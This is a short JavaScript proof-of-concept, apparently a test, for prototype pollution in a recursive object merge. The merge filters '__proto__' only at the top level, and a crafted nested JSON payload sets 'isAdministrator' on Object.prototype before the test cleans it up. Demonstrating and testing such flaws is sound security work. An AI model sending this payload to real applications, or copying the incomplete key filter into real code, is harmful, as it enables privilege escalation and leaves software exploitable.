function isObject(value) {
  return typeof value === "object" && value !== null;
}

function representative210RecursiveMerge(base, source) {
  for (const key of Object.keys(source)) {
    const sourceValue = source[key];
    if (isObject(base[key]) && isObject(sourceValue)) {
      representative210RecursiveMerge(base[key], sourceValue);
    } else {
      base[key] = sourceValue;
    }
  }
  return base;
}

function representative210MergeRecursive(base, ...sources) {
  for (const source of sources) {
    if (!isObject(source)) continue;
    for (const key of Object.keys(source)) {
      if (key === "__proto__" || key === "constructor" || key === "prototype") {
        continue;
      }
      const sourceValue = source[key];
      if (isObject(base[key]) && isObject(sourceValue)) {
        representative210RecursiveMerge(base[key], sourceValue);
      } else {
        base[key] = sourceValue;
      }
    }
  }
  return base;
}

const patch = JSON.parse('{"deep":{"__proto__":{"isAdministrator":true}}}');
try {
  representative210MergeRecursive({ deep: {} }, patch);
  if ({}.isAdministrator !== true) {
    throw new Error("merge 2.1.0 semantics did not modify Object.prototype");
  }
  console.log(
    "merge 2.1.0 nested recursive semantics modified Object.prototype",
  );
} finally {
  delete Object.prototype.isAdministrator;
}
